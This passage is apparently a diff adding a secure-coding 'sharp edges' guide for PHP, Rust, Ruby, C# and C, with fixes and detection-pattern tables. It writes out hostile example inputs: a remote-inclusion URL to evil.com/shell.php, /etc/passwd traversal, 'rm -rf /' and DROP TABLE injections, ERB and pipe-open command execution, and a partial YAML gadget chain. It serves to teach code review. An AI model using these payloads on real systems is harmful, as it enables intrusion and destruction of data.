+// Even without /e, user-controlled patterns are dangerous:
+preg_replace($_GET['pattern'], $replacement, $subject);
+// Attacker can add /e modifier in pattern
+```
+
+**Fix**: Use `preg_replace_callback()` instead of /e.
+
+## include/require with User Input
+
+```php
+// DANGEROUS: Local File Inclusion
+include($_GET['page'] . '.php');
+
+// Attacker: ?page=../../../etc/passwd%00
+// (null byte truncates .php in old PHP)
+
+// Attacker: ?page=php://filter/convert.base64-encode/resource=config
+// Reads and encodes config.php
+
+// DANGEROUS: Remote File Inclusion (if allow_url_include=On)
+include($_GET['url']);
+// Attacker: ?url=http://evil.com/shell.php
+```
+
+**Fix**: Whitelist allowed files, never use user input in include.
+
+## == vs === with Objects
+
+```php
+// DANGEROUS: == compares values, === compares identity
+$a = new stdClass();
+$a->value = 1;
+
+$b = new stdClass();
+$b->value = 1;
+
+$a == $b;   // TRUE - same property values
+$a === $b;  // FALSE - different objects
+
+// This can bypass checks:
+if ($user == $admin) {  // Compares properties, not identity!
+    grantAccess();
+}
+```
+
+## Floating Point in Equality
+
+```php
+// DANGEROUS: Float comparison
+0.1 + 0.2 == 0.3  // FALSE!
+// Actually: 0.30000000000000004
+
+// DANGEROUS: Float to int conversion
+(int)"1e2"   // 1 (not 100!)
+(int)1e2     // 100
+
+// In array keys:
+$arr[(int)"1e2"] = "a";  // $arr[1]
+$arr[(int)1e2] = "b";    // $arr[100]
+```
+
+## Shell Command Injection
+
+```php
+// DANGEROUS: Unescaped shell commands
+system("ls " . $_GET['dir']);
+exec("grep " . $_GET['pattern'] . " file.txt");
+passthru("convert " . $_FILES['image']['name']);
+
+// Attacker: ?dir=; rm -rf /
+```
+
+**Fix**: Use `escapeshellarg()` and `escapeshellcmd()`:
+```php
+system("ls " . escapeshellarg($_GET['dir']));
+```
+
+Better: Avoid shell commands entirely, use PHP functions.
+
+## Array Key Coercion
+
+```php
+// DANGEROUS: Array keys are coerced
+$arr = [];
+$arr["0"] = "a";
+$arr[0] = "b";
+$arr["00"] = "c";
+
+// Result: $arr = [0 => "b", "00" => "c"]
+// String "0" was coerced to integer 0!
+
+$arr[true] = "x";   // $arr[1] = "x"
+$arr[false] = "y";  // $arr[0] = "y"
+$arr[null] = "z";   // $arr[""] = "z"
+```
+
+## Null Coalescing Pitfalls
+
+```php
+// ?? only checks for null/undefined, NOT falsy
+$value = $_GET['x'] ?? 'default';
+
+// If $_GET['x'] is "", 0, "0", false, []
+// These are NOT null, so no default is used!
+
+// vs ternary which checks truthiness:
+$value = $_GET['x'] ?: 'default';  // Uses default for falsy values
+
+// But ?: triggers notice for undefined variables
+```
+
+## Session Fixation
+
+```php
+// DANGEROUS: Accepting session ID from user
+session_id($_GET['session']);
+session_start();
+
+// Attacker:
+// 1. Gets victim to visit: site.com?session=attacker_knows_this
+// 2. Victim logs in
+// 3. Attacker uses same session ID to hijack session
+```
+
+**Fix**: Regenerate session ID after authentication:
+```php
+session_start();
+// ... authenticate user ...
+session_regenerate_id(true);  // true deletes old session
+```
+
+## Detection Patterns
+
+| Pattern | Risk |
+|---------|------|
+| `== ` comparison with user input | Type juggling |
+| `strcmp($user_input, ...)` | NULL comparison bypass |
+| `$$var` or `extract($_` | Variable injection |
+| `unserialize($user_input)` | Object injection RCE |
+| `preg_replace('/e'` | Code execution |
+| `include($user_input)` | File inclusion |
+| `system/exec/passthru($user_input)` | Command injection |
+| `"0e\d+" == "0e\d+"` | Magic hash comparison |
+| `session_id($_GET` | Session fixation |
+| Missing `===` for security checks | Type confusion bypass |
+
+
+### Lang Rust
+
+# Rust Sharp Edges
+
+## Integer Overflow Behavior Differs by Build
+
+```rust
+// In debug builds: panics
+// In release builds: wraps silently!
+let x: u8 = 255;
+let y = x + 1;  // Debug: panic! Release: y = 0
+
+fn calculate_size(count: usize, element_size: usize) -> usize {
+    count * element_size  // Panics in debug, wraps in release
+}
+```
+
+**The Problem**: Behavior differs between debug and release. Bugs may only manifest in production.
+
+**Fix**: Use explicit methods:
+```rust
+// Wrapping (explicitly allows overflow)
+let y = x.wrapping_add(1);
+
+// Checked (returns Option)
+let y = x.checked_add(1);  // None if overflow
+
+// Saturating (clamps to max/min)
+let y = x.saturating_add(1);  // 255 if would overflow
+
+// Overflowing (returns value + overflow flag)
+let (y, overflowed) = x.overflowing_add(1);
+```
+
+## Unsafe Blocks
+
+```rust
+// DANGEROUS: Unsafe disables Rust's safety guarantees
+unsafe {
+    // Can dereference raw pointers
+    let ptr: *const i32 = &42;
+    let val = *ptr;
+
+    // Can call unsafe functions
+    libc::free(ptr as *mut libc::c_void);
+
+    // Can access mutable statics
+    GLOBAL_COUNTER += 1;
+
+    // Can implement unsafe traits
+}
+
+// Real vulnerabilities from unsafe:
+// - CVE-2019-15548: memory safety bug in slice::from_raw_parts
+// - Many FFI-related vulnerabilities
+```
+
+**Audit Focus**: Every `unsafe` block should have a SAFETY comment explaining invariants.
+
+```rust
+// GOOD: Documented safety invariants
+// SAFETY: ptr is valid for reads of `len` bytes,
+// properly aligned, and the memory won't be mutated
+// for the lifetime 'a
+unsafe { std::slice::from_raw_parts(ptr, len) }
+```
+
+## Mem::forget Skips Destructors
+
+```rust
+// DANGEROUS: Resources never cleaned up
+let guard = mutex.lock().unwrap();
+std::mem::forget(guard);  // Lock never released = deadlock
+
+let file = File::open("data.txt")?;
+std::mem::forget(file);  // File descriptor leaked
+
+// Can be used to create memory unsafety with certain types
+let mut vec = vec![1, 2, 3];
+let ptr = vec.as_mut_ptr();
+std::mem::forget(vec);  // Vec's memory leaked, but ptr still valid... maybe
+```
+
+**Note**: `mem::forget` is safe (not `unsafe`), but can cause resource leaks and logical bugs.
+
+## Panics and Unwinding
+
+```rust
+// DANGEROUS: Panic in FFI boundary is UB
+#[no_mangle]
+pub extern "C" fn called_from_c() {
+    panic!("oops");  // Undefined behavior!
+}
+
+// SAFE: Catch panic at FFI boundary
+#[no_mangle]
+pub extern "C" fn called_from_c() -> i32 {
+    match std::panic::catch_unwind(|| {
+        might_panic();
+    }) {
+        Ok(_) => 0,
+        Err(_) => -1,
+    }
+}
+
+// DANGEROUS: Panic in Drop can abort
+impl Drop for MyType {
+    fn drop(&mut self) {
+        if something_wrong() {
+            panic!("in drop");  // If already unwinding, aborts!
+        }
+    }
+}
+```
+
+## Unwrap and Expect
+
+```rust
+// DANGEROUS: Panics on None/Err
+let value = some_option.unwrap();  // Panics if None
+let result = fallible_fn().unwrap();  // Panics if Err
+
+// In libraries: propagate errors with ?
+fn library_fn() -> Result<T, E> {
+    let value = fallible_fn()?;  // Propagates error
+    Ok(value)
+}
+
+// In binaries: use expect() with context
+let config = load_config()
+    .expect("failed to load config from config.toml");
+```
+
+## Interior Mutability Pitfalls
+
+```rust
+// DANGEROUS: RefCell panics at runtime on borrow violations
+use std::cell::RefCell;
+
+let cell = RefCell::new(42);
+let borrow1 = cell.borrow_mut();
+let borrow2 = cell.borrow_mut();  // PANIC: already borrowed
+
+// Can happen across function calls - hard to track
+fn takes_ref(cell: &RefCell<i32>) {
+    let _b = cell.borrow_mut();
+    other_fn(cell);  // If this also borrows_mut: panic!
+}
+
+// SAFER: Use try_borrow_mut
+if let Ok(mut borrow) = cell.try_borrow_mut() {
+    *borrow += 1;
+}
+```
+
+## Send and Sync Misuse
+
+```rust
+// DANGEROUS: Incorrect Send/Sync implementations
+struct MyWrapper(*mut SomeType);
+
+// This is WRONG if SomeType isn't thread-safe:
+unsafe impl Send for MyWrapper {}
+unsafe impl Sync for MyWrapper {}
+
+// Real vulnerability: Rc<T> is not Send/Sync for good reason
+// Incorrectly marking a type as Send/Sync enables data races
+```
+
+## Lifetime Elision Surprises
+
+```rust
+// The compiler infers lifetimes, but sometimes wrong
+impl MyStruct {
+    // Elided: fn get(&self) -> &str
+    // Means:  fn get<'a>(&'a self) -> &'a str
+    fn get(&self) -> &str {
+        &self.data
+    }
+}
+
+// But what if you return something else?
+impl MyStruct {
+    // WRONG: Elision assumes output lifetime = self lifetime
+    fn get_static(&self) -> &str {
+        "static string"  // Actually 'static, not 'self
+    }
+
+    // RIGHT: Be explicit
+    fn get_static(&self) -> &'static str {
+        "static string"
+    }
+}
+```
+
+## Deref Coercion Confusion
+
+```rust
+// Can be confusing when method resolution happens
+use std::ops::Deref;
+
+struct Wrapper(String);
+impl Deref for Wrapper {
+    type Target = String;
+    fn deref(&self) -> &String { &self.0 }
+}
+
+let w = Wrapper(String::from("hello"));
+w.len();  // Calls String::len via Deref
+w.capacity();  // Also String::capacity
+
+// What if Wrapper has its own len()?
+impl Wrapper {
+    fn len(&self) -> usize { 42 }
+}
+w.len();  // Now calls Wrapper::len, not String::len
+(*w).len();  // Explicitly calls String::len
+```
+
+## Drop Order
+
+```rust
+// Fields dropped in declaration order
+struct S {
+    first: A,   // Dropped last
+    second: B,  // Dropped first
+}
+
+// Can cause issues if B depends on A
+struct Connection {
+    pool: Arc<Pool>,      // Dropped second
+    conn: PooledConn,     // Dropped first - needs pool!
+}
+
+// Fix: reorder fields, or use ManuallyDrop
+```
+
+## Macro Hygiene Gaps
+
+```rust
+// macro_rules! has hygiene gaps
+macro_rules! make_var {
+    ($name:ident) => {
+        let $name = 42;
+    }
+}
+
+make_var!(x);
+println!("{}", x);  // Works - x is in scope
+
+// But: macros can capture identifiers unexpectedly
+macro_rules! double {
+    ($e:expr) => {
+        { let x = $e; x + x }  // Shadows any x in $e!
+    }
+}
+
+let x = 10;
+double!(x + 1)  // Doesn't do what you expect
+```
+
+## Detection Patterns
+
+| Pattern | Risk |
+|---------|------|
+| `+`, `-`, `*` on integers | Overflow (release wraps) |
+| `unsafe { }` | All bets off - audit carefully |
+| `mem::forget()` | Resource leak, deadlock |
+| `.unwrap()`, `.expect()` | Panic on None/Err |
+| `RefCell::borrow_mut()` | Runtime panic on double borrow |
+| `unsafe impl Send/Sync` | Potential data races |
+| `extern "C" fn` without catch_unwind | UB on panic |
+| Drop impl with panic | Double panic = abort |
+| Complex deref chains | Method resolution confusion |
+
+
+### Lang Ruby
+
+# Ruby Sharp Edges
+
+## Dynamic Code Execution
+
+```ruby
+# DANGEROUS: eval executes arbitrary code
+eval(user_input)
+
+# DANGEROUS: send calls arbitrary method
+object.send(user_input, *args)
+object.public_send(user_input)  # Only public, still dangerous
+
+# DANGEROUS: constantize gets arbitrary class
+user_input.constantize  # Rails
+Object.const_get(user_input)
+
+# DANGEROUS: instance_variable_get/set
+obj.instance_variable_set("@#{user_input}", value)
+```
+
+**Real Vulnerabilities**:
+- CVE-2013-0156: Rails XML parameter parsing led to code execution
+- Countless Rails apps vulnerable to controller#action injection
+
+**Fix**: Whitelist allowed values:
+```ruby
+ALLOWED_METHODS = %w[create update delete].freeze
+raise unless ALLOWED_METHODS.include?(user_input)
+object.send(user_input)
+```
+
+## YAML.load RCE
+
+```ruby
+# DANGEROUS: Like pickle, instantiates arbitrary objects
+YAML.load(user_input)
+
+# Attacker payload:
+# --- !ruby/object:Gem::Installer
+# i: x
+# --- !ruby/object:Gem::SpecFetcher
+# i: y
+# --- !ruby/object:Gem::Requirement
+# requirements:
+#   !ruby/object:Gem::Package::TarReader
+#   io: &1 !ruby/object:Net::BufferedIO
+#     ...
+
+# Chains through multiple classes to achieve RCE
+```
+
+**Fix**: Use `YAML.safe_load`:
+```ruby
+YAML.safe_load(user_input)
+YAML.safe_load(user_input, permitted_classes: [Date, Time])
+```
+
+## Mass Assignment
+
+```ruby
+# DANGEROUS: All params assigned to model (Rails < 4)
+User.new(params[:user])
+# If params includes {admin: true, role: "superuser"}...
+
+# Also dangerous with update_attributes
+user.update_attributes(params[:user])
+```
+
+**Fix**: Strong Parameters (Rails 4+):
+```ruby
+def user_params
+    params.require(:user).permit(:name, :email)  # Allowlist
+end
+
+User.new(user_params)
+```
+
+## SQL Injection
+
+```ruby
+# DANGEROUS: String interpolation in queries
+User.where("name = '#{params[:name]}'")
+User.where("name = '" + params[:name] + "'")
+
+# DANGEROUS: Array form with interpolation
+User.where(["name = ?", params[:name]])  # Safe
+User.where(["name = #{params[:name]}"])  # NOT safe!
+
+# DANGEROUS: order() with user input
+User.order(params[:sort])  # Can inject: "name; DROP TABLE users--"
+```
+
+**Fix**: Use parameterized queries:
+```ruby
+User.where(name: params[:name])
+User.where("name = ?", params[:name])
+User.order(Arel.sql(sanitize(params[:sort])))  # With validation
+```
+
+## Command Injection
+
+```ruby
+# DANGEROUS: Backticks and system with interpolation
+`ls #{params[:dir]}`
+system("ls #{params[:dir]}")
+exec("ls #{params[:dir]}")
+%x(ls #{params[:dir]})
+
+# Attacker: dir="; rm -rf /"
+```
+
+**Fix**: Use array form:
+```ruby
+system("ls", params[:dir])  # Argument passed safely
+Open3.capture3("ls", params[:dir])
+```
+
+## Regex Injection
+
+```ruby
+# DANGEROUS: User input in regex
+pattern = Regexp.new(params[:pattern])
+string.match(pattern)
+
+# ReDoS attack: pattern = "(a+)+"
+# Denial of service
+
+# Also: Anchors don't work as expected
+/^admin$/.match("admin\nuser")  # Matches! ^ and $ match line boundaries
+```
+
+**Fix**: Use `\A` and `\z` for string boundaries:
+```ruby
+/\Aadmin\z/  # Only matches exactly "admin"
+Regexp.escape(user_input)  # Escape special characters
+```
+
+## Symbol DoS (Ruby < 2.2)
+
+```ruby
+# DANGEROUS in Ruby < 2.2: Symbols never garbage collected
+params[:key].to_sym  # Each unique key creates permanent symbol
+
+# Attacker sends millions of unique parameter names
+# Memory exhaustion - symbols fill memory
+```
+
+**Note**: Fixed in Ruby 2.2+ with symbol GC, but still worth avoiding unnecessary `to_sym` on user input.
+
+## Method Visibility
+
+```ruby
+# DANGEROUS: private/protected don't prevent send()
+class Secret
+    private
+    def sensitive_data
+        "secret"
+    end
+end
+
+obj.send(:sensitive_data)  # Works!
+obj.sensitive_data         # NoMethodError (as expected)
+```
+
+## Default Mutable Arguments
+
+```ruby
+# DANGEROUS: Same pattern as Python
+def add_item(item, list = [])
+    list << item
+    list
+end
+
+add_item(1)  # [1]
+add_item(2)  # [1, 2] - same array!
+```
+
+**Fix**: Use nil default:
+```ruby
+def add_item(item, list = nil)
+    list ||= []
+    list << item
+end
+```
+
+## ERB Template Injection
+
+```ruby
+# DANGEROUS: User input in ERB template
+template = ERB.new(params[:template])
+template.result(binding)
+
+# Attacker template: <%= `whoami` %>
+# Executes shell command
+
+# Also via:
+template = params[:template]
+eval("\"#{template}\"")  # If template contains #{}
+```
+
+## File Operations
+
+```ruby
+# DANGEROUS: Path traversal
+File.read("uploads/#{params[:filename]}")
+# Attacker: filename=../../../etc/passwd
+
+# DANGEROUS: File.open with pipe
+File.open("|#{params[:cmd]}")  # Executes command!
+
+# The | prefix runs a command and opens pipe to it
+File.read("|whoami")  # Returns output of whoami
+```
+
+**Fix**: Validate and sanitize paths:
+```ruby
+path = File.expand_path(params[:filename], uploads_dir)
+raise unless path.start_with?(uploads_dir)
+```
+
+## Comparison Gotchas
+
+```ruby
+# DANGEROUS: == vs eql? vs equal?
+a = "hello"
+b = "hello"
+
+a == b       # true - value comparison
+a.eql?(b)    # true - value + type comparison
+a.equal?(b)  # false - identity comparison
+
+# Array comparison
+[1, 2] == [1, 2]  # true
+[1, 2].eql?([1, 2])  # true
+[1, 2].equal?([1, 2])  # false
+```
+
+## Thread Safety
+
+```ruby
+# DANGEROUS: Ruby global interpreter lock (GIL) doesn't protect everything
+@counter = 0
+
+threads = 10.times.map do
+    Thread.new { 1000.times { @counter += 1 } }
+end
+threads.each(&:join)
+
+@counter  # May not be 10000! Read-modify-write isn't atomic
+```
+
+**Fix**: Use Mutex or atomic operations:
+```ruby
+mutex = Mutex.new
+mutex.synchronize { @counter += 1 }
+```
+
+## Detection Patterns
+
+| Pattern | Risk |
+|---------|------|
+| `eval(`, `instance_eval(` | Code execution |
+| `.send(user_input`, `.public_send(` | Method injection |
+| `.constantize`, `const_get(` | Class injection |
+| `YAML.load(` | Deserialization RCE |
+| `.new(params[` without strong params | Mass assignment |
+| `where("... #{` | SQL injection |
+| `` `...#{` ``, `system("...#{` | Command injection |
+| `Regexp.new(user_input)` | ReDoS |
+| `params[:x].to_sym` | Symbol DoS (old Ruby) |
+| `ERB.new(user_input)` | Template injection |
+| `File.read("|...` or `File.open("|...` | Command execution |
+| `File.read(params[` without path validation | Path traversal |
+
+
+### Lang Csharp
+
+# C# Sharp Edges
+
+## Nullable Reference Types
+
+```csharp
+// DANGEROUS: NRT is opt-in and warnings-only by default
+// Project must enable: <Nullable>enable</Nullable>
+
+string? nullable = null;
+string nonNull = nullable;  // Warning, but compiles!
+nonNull.Length;  // NullReferenceException at runtime
+
+// DANGEROUS: Suppression operator
+string value = possiblyNull!;  // Suppresses warning, doesn't fix bug
+
+// DANGEROUS: Default enabled doesn't mean enforced
+// Many legacy codebases have NRT enabled with thousands of warnings ignored
+```
+
+**Fix**: Enable NRT AND treat warnings as errors:
+```xml
+<Nullable>enable</Nullable>
+<TreatWarningsAsErrors>true</TreatWarningsAsErrors>
+```
+
+## Default Struct Values
+
+```csharp
+// DANGEROUS: Structs have default(T) that may be invalid
+struct Connection {
+    public string Host;  // Default: null
+    public int Port;     // Default: 0
+}
+
+var conn = default(Connection);
+// conn.Host is null, conn.Port is 0 - probably invalid state
+
+// DANGEROUS: Array of structs
+var connections = new Connection[10];
+// All 10 are default(Connection) - invalid state
+```
+
+**Fix**: Use constructors, or make structs readonly with init validation.
+
+## IDisposable Leaks
+
+```csharp
+// DANGEROUS: Resources not disposed on exception
+var conn = new SqlConnection(connectionString);
+conn.Open();
+// Exception here = connection never closed
+Process(conn);
+conn.Dispose();
+
+// DANGEROUS: Nested disposables
+var outer = new Outer();  // Creates inner disposable
+// Exception before outer.Dispose() = inner leaked
+```
+
+**Fix**: Use `using` statement or declaration:
+```csharp
+using var conn = new SqlConnection(connectionString);
+conn.Open();
+// Disposed even on exception
+
+using (var conn = new SqlConnection(...)) {
+    // Scoped disposal
+}
+```
+
+## Async/Await Pitfalls
+
+```csharp
+// DANGEROUS: async void - exceptions can't be caught
+async void FireAndForget() {
+    throw new Exception("Lost!");  // Crashes the process
+}
+
+// DANGEROUS: Deadlock with .Result
+async Task DoWork() {
+    await Task.Delay(100);
+}
+
+void Caller() {
+    DoWork().Result;  // Deadlock in UI/ASP.NET contexts!
+}
+
+// DANGEROUS: Forgetting to await
+async Task Process() {
+    DoWorkAsync();  // Not awaited - runs in background
+    // Exceptions lost, no completion guarantee
+}
+```
+
+**Fix**: Always return Task, use `ConfigureAwait(false)` in libraries:
+```csharp
+async Task DoWorkAsync() {
+    await Task.Delay(100).ConfigureAwait(false);
+}
+```
+
+## LINQ Deferred Execution
+
+```csharp
+// DANGEROUS: LINQ queries are lazy
+var query = items.Where(x => x.IsValid);
+// Nothing executed yet!
+
+items.Add(newItem);  // Added after query defined
+foreach (var item in query) {
+    // newItem IS included - query executes here
+}
+
+// DANGEROUS: Multiple enumeration
+var filtered = items.Where(x => ExpensiveCheck(x));
+var count = filtered.Count();    // Executes query
+var first = filtered.First();    // Executes query AGAIN
+```
+
+**Fix**: Materialize with `.ToList()` or `.ToArray()` when needed.
+
+## String Comparison
+
+```csharp
+// DANGEROUS: Culture-sensitive comparison by default
+"stra\u00dfe".Equals("strasse");  // Depends on culture!
+
+// DANGEROUS: Turkish-I problem
+"INFO".ToLower() == "info"  // FALSE in Turkish culture!
+// Turkish: I → ı (dotless i), İ → i
+
+// DANGEROUS: Ordinal vs linguistic
+string.Compare("a", "A");  // Culture-dependent
+```
+
+**Fix**: Use ordinal comparison for identifiers:
+```csharp
+string.Equals(a, b, StringComparison.Ordinal);
+string.Equals(a, b, StringComparison.OrdinalIgnoreCase);
+```
+
+## Boxing and Unboxing
+
+```csharp
+// DANGEROUS: Hidden boxing with value types
+int value = 42;
+object boxed = value;  // Boxing allocation
+int unboxed = (int)boxed;  // Unboxing
+
+// DANGEROUS: Interface boxing
+struct Point : IComparable<Point> { ... }
+IComparable<Point> comparable = point;  // Boxed!
+
+// DANGEROUS: LINQ with value types
+var ints = new[] { 1, 2, 3 };
+ints.Where(x => x > 1);  // Closure may box
+```
+
+## Equality Implementation
+
+```csharp
+// DANGEROUS: Incorrect equality implementation
+class MyClass {
+    public int Id;
+
+    public override bool Equals(object obj) {
+        return Id == ((MyClass)obj).Id;  // Throws if obj is null or wrong type
+    }
+
+    // DANGEROUS: Missing GetHashCode
+    // Objects that are Equal MUST have same hash code
+    // But: public override int GetHashCode() => ... // Missing!
+}
+```
+
+**Fix**: Implement correctly or use records (C# 9+):
+```csharp
+record MyRecord(int Id);  // Equality implemented correctly
+```
+
+## Lock Pitfalls
+
+```csharp
+// DANGEROUS: Locking on public object
+public object SyncRoot = new object();
+lock (SyncRoot) { }  // External code can deadlock
+
+// DANGEROUS: Locking on this
+lock (this) { }  // External code can lock same object
+
+// DANGEROUS: Locking on Type
+lock (typeof(MyClass)) { }  // Type objects are shared across AppDomains
+
+// DANGEROUS: Locking on string
+lock ("mylock") { }  // String interning makes this shared!
+```
+
+**Fix**: Lock on private readonly object:
+```csharp
+private readonly object _lock = new object();
+lock (_lock) { }
+```
+
+## Finalizers
+
+```csharp
+// DANGEROUS: Finalizer delays GC and can resurrect objects
+class Problematic {
+    ~Problematic() {
+        // This code runs on finalizer thread
+        // Can't access other managed objects safely
+        GlobalList.Add(this);  // Resurrection!
+    }
+}
+
+// DANGEROUS: Finalizer without dispose pattern
+// Object stays in memory longer (finalization queue)
+```
+
+**Fix**: Implement dispose pattern, avoid finalizers:
+```csharp
+class Proper : IDisposable {
+    private bool _disposed;
+
+    public void Dispose() {
+        Dispose(true);
+        GC.SuppressFinalize(this);
+    }
+
+    protected virtual void Dispose(bool disposing) {
+        if (_disposed) return;
+        if (disposing) { /* managed cleanup */ }
+        // unmanaged cleanup
+        _disposed = true;
+    }
+}
+```
+
+## Event Handler Memory Leaks
+
+```csharp
+// DANGEROUS: Event handlers keep objects alive
+class Publisher {
+    public event EventHandler Changed;
+}
+
+class Subscriber {
+    public Subscriber(Publisher pub) {
+        pub.Changed += OnChanged;  // Subscriber now rooted by Publisher
+        // Even if Subscriber should be collected, it won't be
+    }
+}
+```
+
+**Fix**: Unsubscribe in Dispose or use weak events.
+
+## Serialization
+
+```csharp
+// DANGEROUS: BinaryFormatter is insecure
+var formatter = new BinaryFormatter();
+formatter.Deserialize(untrustedStream);  // RCE vulnerability
+
+// Microsoft: "BinaryFormatter is dangerous and is not recommended"
+// Similar issues with NetDataContractSerializer, SoapFormatter
+```
+
+**Fix**: Use JSON, XML with known types, or protobuf.
+
+## Detection Patterns
+
+| Pattern | Risk |
+|---------|------|
+| `string? x = null; string y = x;` | NRT warning ignored |
+| `possiblyNull!` | Null suppression |
+| `new Connection[n]` for structs | Invalid default state |
+| `SqlConnection` without `using` | Resource leak |
+| `async void` | Unhandled exceptions |
+| `.Result` or `.Wait()` on Task | Deadlock |
+| Missing `await` before async call | Fire and forget |
+| `.Where()` without materialization | Multiple enumeration |
+| `string.Equals` without StringComparison | Culture bugs |
+| `lock (this)` or `lock (typeof(...))` | Deadlock risk |
+| `BinaryFormatter` | Deserialization RCE |
+| Event subscription without unsubscription | Memory leak |
+
+
+### Lang C
+
+# C/C++ Sharp Edges
+
+## Integer Overflow is Undefined Behavior
+
+```c
+// DANGEROUS: Signed overflow is UB, compiler can optimize away checks
+int x = INT_MAX;
+if (x + 1 > x) {  // Compiler may assume always true (UB)
+    // Overflow check optimized away!
+}
+
+// DANGEROUS: Size calculations
+size_t size = user_count * sizeof(struct User);
+// If user_count * sizeof overflows, allocates tiny buffer
+void *buf = malloc(size);
+```
+
+**The Problem**: Signed integer overflow is undefined behavior. Compilers assume it never happens and optimize accordingly—including removing overflow checks.
+
+**Detection**: Look for arithmetic on signed integers, especially in size calculations, loop bounds, and allocation sizes.
+
+## Buffer Handling
+
+```c
+// DANGEROUS: No bounds checking
+char buf[64];
+strcpy(buf, user_input);       // Classic overflow
+sprintf(buf, "Hello %s", name); // Format + overflow
+gets(buf);                      // Never use, removed in C11
+
+// DANGEROUS: Off-by-one
+char buf[64];
+strncpy(buf, src, 64);         // NOT null-terminated if src >= 64!
+buf[63] = '\0';                // Must do manually
+
+// DANGEROUS: snprintf return value
+int ret = snprintf(buf, sizeof(buf), "%s", long_string);
+// ret is length that WOULD be written, not actual length
+// If ret >= sizeof(buf), output was truncated
+```
+
+**Safe Alternatives**:
+- `strlcpy`, `strlcat` (BSD, not standard)
+- `snprintf` with proper return value checking
+- C11 Annex K `strcpy_s`, `sprintf_s` (limited support)
+
+## Format Strings
+
+```c
+// DANGEROUS: User controls format
+printf(user_input);            // Format string attack
+syslog(LOG_INFO, user_input);  // Same problem
+fprintf(stderr, user_input);   // Same problem
+
+// Attacker input: "%x%x%x%x" → leaks stack
+// Attacker input: "%n" → writes to memory
+
+// SAFE: Format as literal
+printf("%s", user_input);
+```
+
+**Detection**: Any `*printf` family function where the format argument is not a string literal.
+
+## Memory Cleanup
+
+```c
+// DANGEROUS: Compiler may optimize away
+char password[64];
+// ... use password ...
+memset(password, 0, sizeof(password));  // May be removed!
+
+// The compiler sees: "writes to password, then password goes out of scope"
+// Optimization: "dead store elimination" removes the memset
+```
+
+**Safe Alternatives**:
+```c
+// Option 1: explicit_bzero (BSD, glibc 2.25+)
+explicit_bzero(password, sizeof(password));
+
+// Option 2: SecureZeroMemory (Windows)
+SecureZeroMemory(password, sizeof(password));
+
+// Option 3: Volatile function pointer trick
+static void *(*const volatile memset_ptr)(void *, int, size_t) = memset;
+memset_ptr(password, 0, sizeof(password));
+
+// Option 4: C11 memset_s (limited support)
+memset_s(password, sizeof(password), 0, sizeof(password));
+```
+
+## Uninitialized Variables
+
+```c
+// DANGEROUS: Uninitialized stack variables
+int result;
+if (condition) {
+    result = compute();
+}
+return result;  // Uninitialized if !condition
+
+// DANGEROUS: Uninitialized struct padding
+struct {
+    char a;      // 1 byte
+    // 3 bytes padding (uninitialized)
+    int b;       // 4 bytes
+} s;
+s.a = 'x';
+s.b = 42;
+send(sock, &s, sizeof(s), 0);  // Leaks 3 bytes of stack
+```
+
+**Fix**: Use `= {0}` initialization or `memset`.
+
+## Double Free and Use-After-Free
+
+```c
+// DANGEROUS: Double free
+free(ptr);
+// ... later ...
+free(ptr);  // Heap corruption
+
+// DANGEROUS: Use after free
+free(ptr);
+ptr->value = 42;  // Writing to freed memory
+
+// DANGEROUS: Returning pointer to local
+char *get_greeting() {
+    char buf[64] = "hello";
+    return buf;  // Stack pointer invalid after return
+}
+```
+
+**Mitigations**:
+- Set pointer to NULL after free: `free(ptr); ptr = NULL;`
+- Use static analysis (Coverity, cppcheck)
+- Use AddressSanitizer in testing
+
+## Signal Handler Issues
+
+```c
+// DANGEROUS: Non-async-signal-safe functions in handler
+void handler(int sig) {
+    printf("Got signal\n");  // NOT async-signal-safe
+    malloc(100);             // NOT async-signal-safe
+    free(ptr);               // NOT async-signal-safe
+}
+
+// Async-signal-safe: write(), _exit(), signal()
+// Most functions including printf, malloc, free are NOT safe
+```
+
+## Time-of-Check to Time-of-Use (TOCTOU)
+
+```c
+// DANGEROUS: File state can change between check and use
+if (access(filename, W_OK) == 0) {
+    // Attacker replaces file with symlink here
+    fd = open(filename, O_WRONLY);  // Opens different file
+}
+```
+
+**Fix**: Open first, then check permissions on the file descriptor.
+
+## Variadic Function Pitfalls
+
+```c
+// DANGEROUS: Wrong format specifier
+printf("%d", (long long)value);  // %d expects int, not long long
+printf("%s", 42);                // Interprets 42 as pointer
+
+// DANGEROUS: Missing sentinel
+execl("/bin/ls", "ls", "-l", NULL);  // NULL required!
+execl("/bin/ls", "ls", "-l");        // Missing NULL = UB
+```
+
+## Macro Pitfalls
+
+```c
+// DANGEROUS: Macro arguments evaluated multiple times
+#define SQUARE(x) ((x) * (x))
+int a = 5;
+SQUARE(a++);  // Expands to ((a++) * (a++)) - increments twice!
+
+// DANGEROUS: Operator precedence
+#define ADD(a, b) a + b
+int x = ADD(1, 2) * 3;  // Expands to 1 + 2 * 3 = 7, not 9
+
+// SAFER: Fully parenthesize
+#define ADD(a, b) ((a) + (b))
+```
+
+## Detection Patterns
+
+Search for these patterns in C/C++ code:
+
+| Pattern | Risk |
+|---------|------|
+| `strcpy`, `strcat`, `gets`, `sprintf` | Buffer overflow |
+| `printf(var)` where var is not literal | Format string |
+| `memset` before variable goes out of scope | Dead store elimination |
+| `free(ptr)` without `ptr = NULL` | Double free risk |
+| `malloc` without overflow check on size | Integer overflow |
+| Arithmetic on `int` near INT_MAX | Signed overflow UB |
+| `strncpy` without explicit null termination | Missing terminator |
+
